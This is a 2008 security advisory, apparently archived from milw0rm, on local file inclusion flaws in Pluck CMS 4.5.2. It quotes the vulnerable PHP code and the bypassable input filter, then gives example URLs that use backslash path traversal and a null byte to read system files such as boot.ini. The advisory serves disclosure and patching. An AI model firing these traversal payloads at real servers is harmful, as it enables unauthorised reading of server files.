@@ -1,0 +1,161 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-037
+
+
+Application:                    Pluck CMS
+Versions Affected:              4.5.2
+Vendor URL:                     http://www.pluck-cms.org/
+Bug:                            Multiple Local File Include
+Exploits:                       YES
+Reported:                       28.07.2008
+Vendor Response:                03.08.2008
+Solution:                       YES
+Date of Public Advisory:        25.08.2008
+Author:                         Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+Pluck CMS has Multiple Local File Include vulnerabilities. 
+
+
+
+Details
+*******
+
+1. Local File Include vulnerabilities found in script data/inc/themes/predefined_variables.php
+
+Vulnerable GET parameters "blogpost", "cat" and "file".
+
+First discovered by AmnPardaz Security Research Team [http://www.bugreport.ir/index_48.htm].
+Vendor fixed vulnerability in version 4.5.2 by blocking directly access to this file [http://www.pluck-cms.org/releasenotes.php#4.5.2]. 
+However, attacker still can exploit this vulnerability from index.php file.
+
+Code [line 15-46]
+-----------------
+#################################################
+
+//Make sure the file isn't accessed directly
+if((!ereg("index.php", $_SERVER['SCRIPT_FILENAME'])) && (!ereg("admin.php", $_SERVER['SCRIPT_FILENAME'])) && (!ereg("install.php", $_SERVER['SCRIPT_FILENAME'])) && (!ereg("login.php", $_SERVER['SCRIPT_FILENAME']))){
+    //Give out an "access denied" error
+    echo "access denied";
+    //Block all other code
+    exit();
+}
+
+//Include Translation data
+include ("data/settings/langpref.php");
+include ("data/inc/lang/$langpref");
+//Get Site-title
+$sitetitle = file_get_contents("data/settings/title.dat");
+
+//Get the page-data
+$filetoread = $_GET['file'];
+$album = $_GET['album'];
+$blogpost = $_GET['blogpost'];
+$cat = $_GET['cat'];
+
+if (($filetoread) && (file_exists("data/content/$filetoread"))) {
+include "data/content/$filetoread"; }
+
+elseif ($album) {
+$title = $album; }
+
+elseif (($blogpost) && (file_exists("data/blog/$cat/posts/$blogpost"))) {
+include("data/blog/$cat/posts/$blogpost"); }
+
+elseif ((!file_exists("data/content/$filetoread")) && (!$album) && (!$blogpost)) {
+$title = $lang_front1;
+$content = $lang_front2; }
+
+#################################################
+
+Pluck CMS has security module that checks for hacking attempts and blocks them.
+
+Code
+----
+#################################################
+
+//Remote File Inclusion
+//Check for strange characters in $_GET keys
+//All keys with "/" or ":" are blocked, so it becomes virtually impossible to inject other pages or websites
+  foreach ($_GET as $get_key => $get_value) {
+    if ((ereg("/", $get_value)) || (ereg(":", $get_value))) {
+    eval("unset(\${$get_key});");
+    die("A hacking attempt has been detected. For security reasons, we're blocking any code execution."); }
+  }
+
+#################################################
+
+This vulnerability can be exploited only on systems that accept backslash as a path separator.
+
+Example:
+
+http://[server]/[installdir]/index.php?file=..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini
+http://[server]/[installdir]/index.php?blogpost=..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini
+http://[server]/[installdir]/index.php?blogpost=DSecRG&cat=..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini%00
+
+
+2. Local File Include vulnerabilities found in script data/inc/blog_include_react.php
+
+Vulnerable GET parameters "blogpost" and "cat".
+
+Code [line 15-30]
+-----------------
+#################################################
+
+//Make sure the file isn't accessed directly
+if((!ereg("index.php", $_SERVER['SCRIPT_FILENAME'])) && (!ereg("admin.php", $_SERVER['SCRIPT_FILENAME'])) && (!ereg("install.php", $_SERVER['SCRIPT_FILENAME'])) && (!ereg("login.php", $_SERVER['SCRIPT_FILENAME']))){
+    //Give out an "access denied" error
+    echo "access denied";
+    //Block all other code
+    exit();
+}
+
+//Predefined variable
+$blogpost = $_GET['blogpost'];
+$cat = $_GET['cat'];
+$pageback = $_GET['pageback'];
+list($reactiondir, $extension) = explode(".", $blogpost);
+
+//Include the blogpost
+include("data/blog/$cat/posts/$blogpost");
+
+#################################################
+
+Attacker can exploit vulnerability from index.php file.
+
+This vulnerability can be exploited only on systems that accept backslash as a path separator.
+
+Example:
+
+http://[server]/[installdir]/index.php?blogpost=..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini
+http://[server]/[installdir]/index.php?blogpost=DSecRG&cat=..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini%00
+
+
+
+Solution
+********
+
+Vendor fix this flaw on 22.08.2008. New version of Pluck CMS 4.5.3 can be download here:
+
+http://www.pluck-cms.org/download.php
+
+Release notes:
+
+http://www.pluck-cms.org/releasenotes.php#4.5.3
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards.
+Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:    research [at] dsec [dot] ru
+            http://www.dsec.ru (in Russian)
+
+# milw0rm.com [2008-08-25]
